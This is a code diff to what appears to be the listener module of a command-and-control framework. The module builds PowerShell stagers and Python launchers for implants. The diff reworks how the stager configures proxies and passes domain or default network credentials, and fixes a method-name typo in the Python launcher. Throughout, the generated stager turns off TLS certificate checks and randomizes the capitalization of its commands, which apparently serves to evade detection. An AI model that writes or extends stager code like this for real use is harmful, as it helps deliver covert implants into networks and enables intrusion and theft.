@@ -318,39 +318,38 @@ class Listener:
                     # allow for self-signed certificates for https connections
                     stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
-                if userAgent.lower() != 'none' or proxy.lower() != 'none':
-
-                    if userAgent.lower() != 'none':
-                        stager += helpers.randomize_capitalization('$wc.Headers.Add(')
-                        stager += "'User-Agent',$u);"
-
-                    if proxy.lower() != 'none':
-                        if proxy.lower() == 'default':
-                            stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
+                if userAgent.lower() != 'none':
+                    stager += helpers.randomize_capitalization('$wc.Headers.Add(')
+                    stager += "'User-Agent',$u);"
+                
+                if proxy.lower() != 'none':
+                    if proxy.lower() == 'default':
+                        stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
+                    else:
+                        # TODO: implement form for other proxy
+                        stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('")
+                        stager += proxy.lower()
+                        stager += helpers.randomize_capitalization("');")
+                        stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
+                    if proxyCreds.lower() != 'none':
+                        if proxyCreds.lower() == "default":
+                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                         else:
-                            # TODO: implement form for other proxy
-                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('")
-                            stager += proxy.lower()
-                            stager += helpers.randomize_capitalization("');")
-                            stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
-                        if proxyCreds.lower() != 'none':
-                            if proxyCreds.lower() == "default":
-                                stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
+                            # TODO: implement form for other proxy credentials
+                            username = proxyCreds.split(':')[0]
+                            password = proxyCreds.split(':')[1]
+                            if len(username.split('\\')) > 1:
+                                usr = username.split('\\')[1]
+                                domain = username.split('\\')[0]
+                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                             else:
-                                # TODO: implement form for other proxy credentials
-                                username = proxyCreds.split(':')[0]
-                                password = proxyCreds.split(':')[1]
-                                if len(username.split('\\')) > 1:
-                                    usr = username.split('\\')[1]
-                                    domain = username.split('\\')[0]
-                                    stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
-                                else:
-                                    usr = username.split('\\')[0]
-                                    stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
-                                stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
-
-                        #save the proxy settings to use during the entire staging process and the agent
-                        stager += "$Script:Proxy = $wc.Proxy;"
+                                usr = username.split('\\')[0]
+                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
+                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
+                else:
+                    stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();")
+                    #save the proxy settings to use during the entire staging process and the agent
+                stager += "$Script:Proxy = $wc.Proxy;"
 
                 # TODO: reimplement stager retries?
                 #check if we're using IPv6
@@ -461,7 +460,7 @@ class Listener:
                     if proxy.lower() == "default":
                         launcherBase += "proxy = urllib2.ProxyHandler();\n"
                     else:
-                        proto = proxy.Split(':')[0]
+                        proto = proxy.split(':')[0]
                         launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"
 
                     if proxyCreds != "none":
